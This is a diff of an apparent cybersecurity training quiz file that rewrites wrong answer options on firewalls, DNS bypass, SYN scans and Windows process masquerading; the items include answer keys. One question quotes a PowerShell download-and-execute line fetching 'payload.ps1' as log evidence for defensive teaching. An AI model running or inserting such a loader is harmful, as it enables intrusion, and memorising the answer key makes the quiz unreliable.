@@ -359,10 +359,10 @@ When you're investigating a security incident, these networking concepts form yo
             question:
               "The log shows src_ip: 10.5.12.47 and nat_src_ip: 203.0.113.15. What does this tell you?",
             options: [
-              "There are two attackers — one at each IP address",
-              "The workstation has two network interfaces",
+              "There are two attackers, one working from each IP address, coordinating the same reverse-shell session in parallel",
+              "The workstation has two separate network interfaces, each assigned its own IP, and the firewall logged both simultaneously",
               "NAT translation occurred — the workstation's private IP (10.5.12.47) was translated to the company's public IP (203.0.113.15) as traffic left the network",
-              "The connection was blocked because the NAT failed",
+              "The connection was blocked because the NAT translation table on the firewall ran out of available ports and failed to complete the mapping",
             ],
             answer: 2,
             explanation:
@@ -706,10 +706,10 @@ These questions form the foundation of network-based threat investigation.`,
             question:
               "Why is the domain 'xk3r9qlpmf7wz2.com' suspicious compared to a normal domain like 'microsoft.com'?",
             options: [
-              "It uses the .com TLD which is reserved for commercial use only",
-              "It is too short — domains must be at least 20 characters",
+              "It uses the .com TLD, which is reserved exclusively for pre-vetted commercial businesses and cannot be registered by an individual or a piece of malware infrastructure",
+              "It is too short — ICANN requires all registered second-level domain names to be at least 20 characters long, so anything shorter is inherently invalid",
               "It appears randomly generated with high entropy (random-looking mix of letters and numbers with no recognizable words) — a hallmark of DGA (Domain Generation Algorithm) malware",
-              "It contains numbers, which are not allowed in domain names",
+              "It contains numbers, which are not allowed in domain names under the DNS specification and should have caused the query to be rejected outright",
             ],
             answer: 2,
             explanation:
@@ -720,10 +720,10 @@ These questions form the foundation of network-based threat investigation.`,
             question:
               "The log shows dst_ip: 8.8.8.8 instead of 10.0.0.53 (the corporate DNS). What is the security significance of this?",
             options: [
-              "8.8.8.8 is faster than 10.0.0.53 so the workstation is optimizing network performance",
+              "8.8.8.8 is faster than 10.0.0.53, so the workstation's network stack automatically prefers it whenever both servers are reachable, purely for performance reasons",
               "The workstation is bypassing the corporate DNS server to use Google's public DNS — this avoids corporate DNS monitoring and filtering, allowing the malware to reach domains that would be blocked",
-              "8.8.8.8 is the default DNS for all Windows workstations",
-              "This indicates the corporate DNS server is down, so the workstation found a backup",
+              "8.8.8.8 is the factory-default DNS server baked into every Windows installation, so any workstation querying it is simply using the unconfigured out-of-box setting",
+              "This indicates the corporate DNS server at 10.0.0.53 is down, so Windows automatically failed over to a public resolver as a built-in redundancy feature",
             ],
             answer: 1,
             explanation:
@@ -859,13 +859,13 @@ The order matters. Rule 3 comes before Rule 4 explicitly denies SSH — without 
         checkpoint: {
           question: "According to the reading, what is the key limitation of a Generation 1 packet-filtering firewall?",
           options: [
-            "It cannot process TCP traffic at all",
+            "It cannot process TCP traffic at all — packet filters are limited to inspecting UDP and ICMP headers only",
             "It is stateless — it cannot tell whether a packet belongs to an already-established connection",
-            "It requires an NGFW license to operate",
-            "It can only be deployed in the cloud",
+            "It requires a separate NGFW license key to be installed before any rules can be enforced, even basic ones",
+            "It can only be deployed in the cloud, since the packet-filtering architecture is incompatible with on-premises hardware appliances",
           ],
           answer: 1,
-          explanation: "Packet-filtering firewalls examine each packet in isolation with no memory of prior packets, so a crafted packet with the 'right' flags can slip through as if it were part of a legitimate session.",
+          explanation: "Packet-filtering firewalls examine each packet in isolation with no memory of prior packets, so a crafted packet with the 'right' flags can slip through as if it were part of a legitimate session. It has nothing to do with TCP-only support, licensing, or cloud-only deployment — those are all fabricated limitations.",
         },
       },
       {
@@ -953,10 +953,10 @@ WAFs sit in front of web applications — either inline (blocking mode) or out-o
         checkpoint: {
           question: "According to the reading, what is the key difference between an IDS and an IPS?",
           options: [
-            "An IDS blocks traffic while an IPS only alerts",
+            "An IDS blocks traffic automatically while an IPS only alerts and requires manual review before anything is stopped",
             "An IDS passively detects and alerts; an IPS sits inline and actively blocks malicious traffic",
-            "IDS and IPS are two names for the exact same technology",
-            "An IDS only works on encrypted HTTPS traffic",
+            "IDS and IPS are simply two different marketing names vendors use for the exact same underlying detection technology",
+            "An IDS only works on encrypted HTTPS traffic, while an IPS is limited to inspecting unencrypted HTTP and FTP sessions",
           ],
           answer: 1,
           explanation: "IDS is the 'note-taking guard' — it monitors and alerts but takes no action. IPS sits inline in the traffic path and can actively block malicious traffic in real time.",
@@ -1049,10 +1049,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
         question:
           "A web server in your company's DMZ was compromised by an attacker. Because of proper DMZ architecture, what does the attacker still need to do to reach the internal corporate database?",
         options: [
-          "Nothing — the DMZ is part of the internal network, so they have full access",
-          "They only need to change their IP address to an internal one",
+          "Nothing — the DMZ is architecturally part of the internal network, so full access to the database is available the moment the web server is compromised",
+          "They only need to change their own machine's IP address to something inside the internal range, since firewalls trust traffic based purely on the source IP presented",
           "They must bypass or compromise a second firewall (between the DMZ and internal network) because the DMZ is isolated from the internal network",
-          "They need to wait for a user to log in before they can access internal systems",
+          "They need to wait for a legitimate user to log into the compromised web server before any pivot to internal systems becomes technically possible",
         ],
         answer: 2,
         explanation:
@@ -1065,10 +1065,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
         question:
           "What is the key difference between a stateful and a stateless (packet filtering) firewall?",
         options: [
-          "Stateful firewalls are faster because they don't have to store any information",
-          "Stateless firewalls track active connections while stateful firewalls only check individual packets",
+          "Stateful firewalls are faster because they never store any information about connections and simply forward everything after a one-time rule check",
+          "Stateless firewalls track active connections in a state table while stateful firewalls only check individual packets in isolation with no memory",
           "Stateful firewalls track the state of active connections and only allow packets that are part of established, legitimate sessions — stateless firewalls inspect each packet in isolation without connection context",
-          "Stateless firewalls can inspect HTTPS traffic while stateful firewalls cannot",
+          "Stateless firewalls can decrypt and inspect HTTPS traffic natively while stateful firewalls are structurally incapable of processing any encrypted protocol",
         ],
         answer: 2,
         explanation:
@@ -1116,10 +1116,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
             question:
               "The log shows 'syn_packets_without_ack: 14'. In the context of TCP's three-way handshake, what does this indicate about the scan technique?",
             options: [
-              "The attacker's computer had a network problem that caused lost packets",
+              "The attacker's computer had an unstable network connection that caused the final ACK packets to be dropped in transit before reaching the target, unrelated to any scanning intent",
               "This is a SYN scan (half-open scan) — the attacker sent SYN packets to probe ports but never completed the handshake. If a port is open, the server sends SYN-ACK; if closed, it sends RST. By never sending the final ACK, the attacker maps open ports without fully establishing connections (harder to detect)",
-              "The firewall was successfully blocking all the connection attempts",
-              "This is normal TCP behavior — ACK packets arrive separately from SYN packets",
+              "The firewall was successfully blocking all the connection attempts, which is exactly why no ACK packets were recorded following any of the SYN packets sent",
+              "This is normal TCP behavior for a busy server — ACK packets are routinely batched and sent as a group well after the corresponding SYN packets arrive",
             ],
             answer: 1,
             explanation:
@@ -1130,10 +1130,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
             question:
               "Looking at the dst_ports_scanned list, which port should be most concerning if found open and accessible from the internet?",
             options: [
-              "Port 80 — HTTP web traffic should never be internet-accessible",
-              "Port 53 — DNS should never be visible from the internet",
+              "Port 80 — HTTP web traffic should never be reachable from the internet under any circumstances, even for a public-facing marketing site",
+              "Port 53 — DNS should never be visible from the internet, since any exposed DNS server is automatically an open resolver abused for amplification attacks",
               "Port 3389 (RDP) — Remote Desktop Protocol exposed to the internet is a critical risk and a top initial access vector for ransomware attacks",
-              "Port 443 — HTTPS is the most dangerous protocol for internet-facing servers",
+              "Port 443 — HTTPS is inherently the most dangerous protocol to expose because encryption itself is what attackers exploit to gain access",
             ],
             answer: 2,
             explanation:
@@ -1474,10 +1474,10 @@ For SOC analysts: Windows Defender generates security event logs (Event ID 1116 
         question:
           "A SOC analyst notices that lsass.exe is running from C:\\Users\\attacker\\AppData\\Temp\\lsass.exe instead of C:\\Windows\\System32\\lsass.exe. What does this most likely indicate?",
         options: [
-          "This is normal — Windows sometimes runs system processes from user directories for performance",
+          "This is normal — Windows occasionally relocates core system processes into user-writable directories temporarily to improve boot performance on slower disks",
           "This is a fake lsass.exe process — likely malware disguising itself as the legitimate Windows authentication process. The real lsass.exe always runs from System32",
-          "The user has moved lsass.exe to a new location as part of a system optimization",
-          "This indicates a Windows Update is in progress, temporarily relocating system files",
+          "The user has manually moved lsass.exe to a new location as part of a routine system optimization recommended by Windows",
+          "This indicates a Windows Update is currently in progress, temporarily relocating system files into the user's Temp folder during installation",
         ],
         answer: 1,
         explanation:
@@ -1545,10 +1545,10 @@ For SOC analysts: Windows Defender generates security event logs (Event ID 1116 
             question:
               "The parent process is winword.exe and the child process is powershell.exe. Why is this parent-child relationship suspicious?",
             options: [
-              "Microsoft Word requires PowerShell to run — this is a normal and expected process tree",
-              "PowerShell should always be started by the System process, never by user applications",
+              "Microsoft Word requires PowerShell as a background dependency to render documents, so seeing winword.exe spawn powershell.exe is a normal and fully expected process tree",
+              "PowerShell should always be started by the System process (PID 4) directly, and any other parent process, including user applications, is a Windows configuration error unrelated to malware",
               "Microsoft Word (a document editor) spawning PowerShell (a powerful scripting engine) strongly suggests a malicious macro inside the Word document executed a command — a common initial access technique for malware delivered via phishing emails",
-              "This only becomes suspicious if PowerShell then spawns another process — a single level of nesting is acceptable",
+              "This only becomes suspicious if PowerShell then spawns another process itself — a single level of nesting from winword.exe straight to powershell.exe is considered acceptable and expected",
             ],
             answer: 2,
             explanation:
@@ -1559,10 +1559,10 @@ For SOC analysts: Windows Defender generates security event logs (Event ID 1116 
             question:
               "The decoded_command field shows: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')'. What is this command doing?",
             options: [
-              "Checking Windows Update servers for available patches",
-              "Running a diagnostic script that Microsoft pre-installs on all Windows systems",
+              "Checking Microsoft's official Windows Update servers for any patches that are currently available for the operating system",
+              "Running a routine diagnostic script that Microsoft pre-installs on every modern Windows system as part of telemetry collection",
               "Downloading a PowerShell script from an internal server (192.168.10.50) and immediately executing it in memory using IEX (Invoke-Expression) — a fileless execution technique that avoids writing the payload to disk",
-              "Connecting to Microsoft's cloud to validate the Office license",
+              "Connecting to Microsoft's licensing cloud service to re-validate the installed Office subscription's activation status",
             ],
             answer: 2,
             explanation:
@@ -1586,10 +1586,10 @@ For SOC analysts: Windows Defender generates security event logs (Event ID 1116 
         question:
           "A SOC analyst is investigating a Windows server. They notice a service called 'WindowsSecurityHelper' running from C:\\ProgramData\\wsh\\svchost.exe. What is suspicious about this?",
         options: [
-          "Services should not have descriptive names — they should only use numbers",
+          "Services should not have human-readable descriptive names at all — the Windows Service Control Manager only accepts purely numeric identifiers for legitimate services",
           "The real svchost.exe lives in C:\\Windows\\System32\\, not in C:\\ProgramData\\. Running a file named svchost.exe from a non-standard location is a classic malware masquerading technique. C:\\ProgramData\\ is writable without admin rights on some configurations.",
-          "Services are only allowed to run from the Windows directory — C:\\ProgramData\\ is not allowed",
-          "The service name 'WindowsSecurityHelper' contains too many characters for a Windows service name",
+          "Services are only ever allowed to run from directly inside the Windows directory itself, so C:\\ProgramData\\ is structurally rejected by the Service Control Manager before it can even start",
+          "The service name 'WindowsSecurityHelper' exceeds the maximum character limit Windows enforces for service names, which is why it should be flagged automatically",
         ],
         answer: 1,
         explanation:
